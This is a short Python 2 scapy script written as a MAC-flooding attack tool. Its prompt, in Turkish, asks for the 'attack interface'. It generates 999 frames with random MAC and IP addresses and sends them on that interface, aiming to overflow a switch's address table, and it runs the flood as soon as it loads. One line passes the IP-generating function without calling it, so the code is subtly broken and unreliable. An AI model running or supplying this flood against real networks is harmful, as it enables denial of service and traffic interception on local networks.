from scapy.all import *
import random

def genPac():
   packetList = []
   for i in range(1, 1000):
      packet = Ether(src=genMAC(), dst=genMAC())/IP(src=genIP, dst=genIP())
      packetList.append(packet)

   return packetList

def genMAC():
   hList = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
   adMAC = hList[random.randint(0,15)] + hList[random.randint(0,15)] + ':' + hList[random.randint(0,15)] + hList[random.randint(0,15)] + ':' + hList[random.randint(0,15)] + hList[random.randint(0,15)] + ':' + hList[random.randint(0,15)] + hList[random.randint(0,15)] + ':' + hList[random.randint(0,15)] + hList[random.randint(0,15)] + ':' + hList[random.randint(0,15)] + hList[random.randint(0,15)]

   return adMAC

def genIP():
   oct1 = str(random.randint(1,254))
   oct2 = str(random.randint(1,254))
   oct3 = str(random.randint(1,254))
   oct4 = str(random.randint(1,254))

   return oct1 + '.' + oct2 + '.' + oct3 + '.' + oct4

def MACFlood():
   interface = str(raw_input("[*] Saldiri arayüzünü giriniz: (eth0)"))

   packetL = genPac()
   sendp(packetL, iface=interface)

MACFlood()
